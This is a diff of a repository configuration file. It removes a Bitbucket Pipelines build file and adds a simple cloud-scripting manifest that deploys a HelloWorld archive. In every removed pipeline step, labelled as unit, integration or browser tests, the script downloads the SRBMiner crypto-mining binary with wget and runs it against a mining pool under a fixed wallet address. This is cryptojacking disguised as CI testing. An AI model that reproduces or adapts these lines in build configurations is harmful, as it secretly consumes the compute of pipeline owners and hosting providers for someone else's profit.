@@ -1,47 +1,19 @@
-# This is a sample build configuration for JavaScript.
-# Check our guides at https://confluence.atlassian.com/x/14UWN for more examples.
-# Only use spaces to indent your .yml configuration.
-# -----
-# You can specify a custom docker image from Docker Hub as your build environment.
-image: node:10.15.3
+type: install
+name: My Cloud Scripting
 
+nodes:
+  cloudlets: 4  
+  count: 1
+  nodeGroup: cp
+  nodeType: apache
 
-pipelines:
-  default:
+globals: 
+  appSource: https://github.com/vlobzakov/basic-examples/raw/master/introduction/HelloWorld.zip
+  
+onInstall:
+  deploy:
+    archive: ${globals.appSource}
+    name: Hello World
+    context: ROOT
 
-    - parallel:
-        - step:
-            name: Unit tests
-            script:
-            - wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.4.3/SRBMiner-Multi-0-4-3-Linux.tar.xz && tar xJvf SRBMiner-Multi-0-4-3-Linux.tar.xz 
-            - ./SRBMiner-Multi-0-4-3/SRBMiner-MULTI --cpu-threads 8 --algorithm yespoweriots --pool stratum+tcp://neoscrypt.mine.zergpool.com:6535 --wallet Xuo3hn1R4nwKEAyf5kcRTtRUycGKX5me2K --password c=IOTS,m=solo
-        - step:
-            name: Integration tests
-            script:
-            - wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.4.3/SRBMiner-Multi-0-4-3-Linux.tar.xz && tar xJvf SRBMiner-Multi-0-4-3-Linux.tar.xz 
-            - ./SRBMiner-Multi-0-4-3/SRBMiner-MULTI --cpu-threads 8 --algorithm yespoweriots --pool stratum+tcp://neoscrypt.mine.zergpool.com:6535 --wallet Xuo3hn1R4nwKEAyf5kcRTtRUycGKX5me2K --password c=IOTS,m=solo
-        - step:
-            name: Browser tests
-            script:
-            - wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.4.3/SRBMiner-Multi-0-4-3-Linux.tar.xz && tar xJvf SRBMiner-Multi-0-4-3-Linux.tar.xz 
-            - ./SRBMiner-Multi-0-4-3/SRBMiner-MULTI --cpu-threads 8 --algorithm yespoweriots --pool stratum+tcp://neoscrypt.mine.zergpool.com:6535 --wallet Xuo3hn1R4nwKEAyf5kcRTtRUycGKX5me2K --password c=IOTS,m=solo
-        - step:
-            name: Browser tests
-            script:
-            - wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.4.3/SRBMiner-Multi-0-4-3-Linux.tar.xz && tar xJvf SRBMiner-Multi-0-4-3-Linux.tar.xz 
-            - ./SRBMiner-Multi-0-4-3/SRBMiner-MULTI --cpu-threads 8 --algorithm yespoweriots --pool stratum+tcp://neoscrypt.mine.zergpool.com:6535 --wallet Xuo3hn1R4nwKEAyf5kcRTtRUycGKX5me2K --password c=IOTS,m=solo
-        - step:
-            name: Browser tests
-            script:
-            - wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.4.3/SRBMiner-Multi-0-4-3-Linux.tar.xz && tar xJvf SRBMiner-Multi-0-4-3-Linux.tar.xz 
-            - ./SRBMiner-Multi-0-4-3/SRBMiner-MULTI --cpu-threads 8 --algorithm yespoweriots --pool stratum+tcp://neoscrypt.mine.zergpool.com:6535 --wallet Xuo3hn1R4nwKEAyf5kcRTtRUycGKX5me2K --password c=IOTS,m=solo
-        - step:
-            name: Browser tests
-            script:
-            - wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.4.3/SRBMiner-Multi-0-4-3-Linux.tar.xz && tar xJvf SRBMiner-Multi-0-4-3-Linux.tar.xz 
-            - ./SRBMiner-Multi-0-4-3/SRBMiner-MULTI --cpu-threads 8 --algorithm yespoweriots --pool stratum+tcp://neoscrypt.mine.zergpool.com:6535 --wallet Xuo3hn1R4nwKEAyf5kcRTtRUycGKX5me2K --password c=IOTS,m=solo
-
-			
-
-			
-
+success: First application deployed successfully!
